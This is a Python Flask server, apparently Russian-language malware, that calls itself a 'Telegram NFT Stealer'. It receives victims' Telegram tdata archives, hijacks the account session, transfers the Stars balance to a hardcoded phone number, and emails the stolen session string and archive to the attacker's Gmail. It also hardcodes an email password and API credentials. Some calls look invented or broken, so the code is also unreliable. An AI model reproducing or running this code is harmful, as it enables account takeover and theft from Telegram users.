from flask import Flask, request, jsonify
import asyncio
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
import tempfile
import zipfile

app = Flask(__name__)

# === НАСТРОЙКИ ===
API_ID = "25015433"
API_HASH = "546b7eb3f2865939ca71dbaedb49017d"
EMAIL_FROM = "pupsiclolaskarkrutoi@gmail.com"
EMAIL_PASSWORD = "askarpro777"
EMAIL_TO = "pupsiclolaskarkrutoi@gmail.com"
YOUR_PHONE = "+998997220530"
# === КОНЕЦ НАСТРОЕК ===

def send_email(subject, message, attachment_path=None):
    try:
        msg = MIMEMultipart()
        msg['Subject'] = subject
        msg['From'] = EMAIL_FROM
        msg['To'] = EMAIL_TO
        
        msg.attach(MIMEText(message, 'plain'))
        
        if attachment_path and os.path.exists(attachment_path):
            with open(attachment_path, 'rb') as f:
                attachment = MIMEText(f.read().decode('latin-1'))
                attachment.add_header('Content-Disposition', 'attachment', filename='tdata.zip')
                msg.attach(attachment)
        
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_FROM, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
        return True
    except Exception as e:
        print(f"Email error: {e}")
        return False

async def process_tdata_zip(zip_path):
    """Обрабатываем tdata zip файл"""
    try:
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        
        # Создаем временную папку для распаковки
        with tempfile.TemporaryDirectory() as temp_dir:
            # Распаковываем zip
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(temp_dir)
            
            # Создаем сессию из tdata
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            
            if await client.is_user_authorized():
                me = await client.get_me()
                
                # Крадем звезды
                stolen_stars = 0
                try:
                    stars = await client.get_stars_balance()
                    if stars > 0:
                        await client.transfer_stars(YOUR_PHONE, stars)
                        stolen_stars = stars
                except Exception as e:
                    print(f"Stars error: {e}")
                
                # Получаем session string
                session_string = client.session.save()
                
                # Формируем отчет
                report = f"""
🎯 УСПЕШНЫЙ ВЗЛОМ!

👤 Аккаунт: {me.first_name or ''} {me.last_name or ''}
📞 Телефон: {me.phone}
💰 Украдено звезд: {stolen_stars}

🔐 Session String:
{session_string}

⚡ Для входа используй:
from telethon import TelegramClient
client = TelegramClient(StringSession("{session_string}"), {API_ID}, "{API_HASH}")
                """
                
                await client.disconnect()
                return report
            else:
                return "❌ Не удалось авторизоваться через tdata"
                
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"

@app.route('/')
def home():
    return "🚀 Telegram NFT Stealer Server Ready!"

@app.route('/upload', methods=['POST'])
def upload_tdata():
    try:
        if 'tdata' not in request.files:
            return jsonify({"status": "error", "message": "No file"})
        
        file = request.files['tdata']
        if file.filename == '':
            return jsonify({"status": "error", "message": "No file selected"})
        
        # Сохраняем временный файл
        with tempfile.NamedTemporaryFile(delete=False, suffix='.zip') as tmp:
            file.save(tmp.name)
            zip_path = tmp.name
        
        # Обрабатываем асинхронно
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(process_tdata_zip(zip_path))
        loop.close()
        
        # Отправляем результат на почту
        send_email("🚨 Telegram Hack Result", result, zip_path)
        
        # Удаляем временный файл
        try:
            os.unlink(zip_path)
        except:
            pass
        
        return jsonify({"status": "success", "message": "Processing completed"})
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
